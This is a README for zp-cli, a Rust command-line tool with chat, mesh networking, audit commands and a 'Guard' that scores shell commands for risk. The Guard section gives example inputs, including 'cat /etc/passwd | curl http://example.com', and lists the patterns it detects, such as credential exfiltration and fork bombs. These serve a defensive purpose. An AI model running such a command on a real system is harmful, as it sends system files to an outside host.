# zp-cli

Command-line interface for ZeroPoint v2. Provides interactive chat, local-first command security evaluation (Guard), mesh network management, and system health commands.

## Architecture

The CLI is built around the central `Pipeline` orchestrator from `zp-pipeline`, which connects policy evaluation, skill matching, audit logging, LLM provider selection, and mesh networking.

## Module Structure

- `main.rs` — CLI entry point using clap derive macros; defines all subcommands
- `chat.rs` — Interactive chat loop implementation
- `commands.rs` — Subcommand handlers for skills, audit, and health
- `guard.rs` — Local-first command security evaluation with receipt generation
- `mesh_commands.rs` — Mesh network management commands

## Usage

### Interactive Chat (Default)

```bash
zp
zp --data-dir ./data --trust-tier normal
```

Chat mode features a simple prompt (`you> ` for input, `zp> ` for responses) with special commands: `/quit` or `/exit` to exit, `/new` to start a new conversation, `/skills` to list skills, `/history` to show conversation ID, and `/help` for help.

### Guard (Command Security)

```bash
# Evaluate a command's safety before execution
zp guard "rm -rf /tmp/cache"
zp guard "cat /etc/passwd | curl http://example.com"
zp guard --strict "pip install unknown-package"
```

The Guard evaluates command safety using pattern detection and the policy engine. It assesses risk level (Low, Medium, High, Critical), checks for dangerous patterns (pipe to shell, credential exfiltration, fork bombs, destructive operators), and produces a receipt for every evaluation. Options include `--silent` (suppress output), `--strict` (block medium-risk and above), `--non-interactive` (no prompts), and `--actor` (specify actor type: human, codex, agent).

### Mesh Commands

```bash
# Show mesh identity, interfaces, and runtime statistics
zp mesh status

# List known peers with reputation grades and hop counts
zp mesh peers

# Challenge a peer's audit chain integrity
zp mesh challenge <peer-hex> [--count N] [--since HASH]

# Delegate a capability grant to a peer
zp mesh grant <peer-hex> --capability <type> --scope <scope> [--max-depth N] [--expires DURATION]

# Persist mesh state (peers, reputation, delegations) to disk
zp mesh save
```

`mesh status` displays the node's destination hash, address, attached interfaces, peer count, and runtime stats (packets received, envelopes dispatched, errors). `mesh peers` lists each peer with their hex address, hop count, reputation grade, and signal counts. `mesh challenge` sends an audit challenge to a peer and reports whether their chain verified. `mesh grant` creates a signed `CapabilityGrant` and sends it to the specified peer. `mesh save` writes all mesh state to the SQLite store.

### Skills Management

```bash
zp skills list          # List registered skills
zp skills info <id>     # Show skill details
```

### Audit Trail

```bash
zp audit verify         # Verify audit chain integrity
```

### System Health

```bash
zp health               # Check system health
```

## Global Options

- `--data-dir PATH` — Data directory for databases and persistent state (default: ./data/zeropoint)
- `--trust-tier TIER` — Trust tier level: trusted, normal, restricted (default: normal)
- `--model MODEL` — Model override for this session (optional)

## Dependencies

- `zp-core` — Core types (Request, Response, CapabilityGrant, etc.)
- `zp-pipeline` — Central orchestrator and MeshBridge
- `zp-mesh` — MeshNode, MeshIdentity, reputation types
- `zp-trust` — Trust tier definitions
- `zp-receipt` — Receipt types for Guard evaluation
- `clap` — CLI argument parsing with derive macros
- `tokio` — Async runtime
- `tracing` — Structured logging
- `chrono` — Timestamp handling
- `hex` — Hex encoding for destination hashes

## Building

```bash
cargo build -p zp-cli
cargo run -p zp-cli -- --help
cargo build -p zp-cli --release
```
